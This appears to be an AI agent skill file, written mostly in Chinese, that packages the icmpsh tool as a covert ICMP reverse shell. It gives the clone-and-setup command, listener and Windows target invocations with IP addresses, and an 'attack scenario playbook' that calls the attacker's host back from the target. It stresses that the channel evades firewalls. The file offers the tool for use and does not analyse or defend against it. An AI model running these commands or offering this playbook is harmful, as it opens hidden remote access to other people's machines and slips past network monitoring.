---
name: icmpsh-reverse
description: "icmpsh provides an ICMP covert reverse shell. Signals: covert callback, communication channel, Python listener, Windows target, latency ms."
zh-signals: "icmpsh: ICMP 隐蔽反弹 shell。信号:隐蔽回连,通信通道,监听端(Python),Windows 目标端,延迟 ms。"
---

# icmpsh

- 攻击大类:C36 隐蔽回连与通信通道
- 上游仓库:https://github.com/bdamele/icmpsh
- 上游 License:NOASSERTION(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/bdamele/icmpsh && sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./icmpsh_m.py 10.8.0.2 10.0.0.5` | 监听端(Python) |
| `icmpsh.exe -t 10.8.0.2` | Windows 目标端 |
| `-d 500` | 延迟 ms |

## 攻击场景 Playbook

### ICMP 隐蔽反弹 shell

```bash
./icmpsh_m.py 10.8.0.2 10.0.0.5  # 攻击机
icmpsh.exe -t 10.8.0.2          # 目标机(无监听器进程)
```

## 注意事项

纯 ICMP 通信,不监听端口,多数防火墙默认放 ping;目标端单 exe 无依赖。
